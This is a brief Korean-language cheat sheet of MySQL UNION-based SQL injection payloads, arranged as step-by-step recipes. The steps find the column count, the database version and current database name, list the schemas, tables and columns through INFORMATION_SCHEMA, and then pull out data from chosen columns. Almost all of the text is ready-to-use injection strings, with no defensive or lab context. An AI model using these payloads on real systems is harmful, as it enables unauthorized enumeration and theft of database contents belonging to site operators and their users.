# 컬럼 개수 알아내기

```
' UNION SELECT NULL-- -
' UNION SELECT NULL, NULL-- -
' UNION SELECT NULL, NULL, NULL-- -
' UNION SELECT NULL, NULL, NULL, NULL-- -
```

<br>

# DB 버전 및 이름 알아내기

```
' UNION SELECT NULL, NULL, @@version, NULL-- -
```

<br>

# DB 리스트 알아내기

```
' UNION SELECT NULL, schema_name, NULL, NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

<br>

# 현재 DB 알아내기

```
' UNION SELECT NULL, database(), NULL, NULL-- -
```

<br>

# 테이블 리스트 알아내기

```
' UNION SELECT NULL, TABLE_NAME, TABLE_SCHEMA, NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = <database_name>-- -
```

설명: WHERE절에서 DB명의 자료형이 문자열인 경우 해당 DB명에는 따옴표 필요

<br>

# 컬럼 리스트 알아내기

```
' UNION SELECT NULL, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = <table_name>-- -
```

설명: WHERE절에서 테이블명의 자료형이 문자열인 경우 해당 테이블명에는 따옴표 필요

<br>

# 데이터 알아내기

```
' UNION SELECT 1, <column_name1>, <column_name2>, NULL FROM <database_name>.<table_name>-- -
```
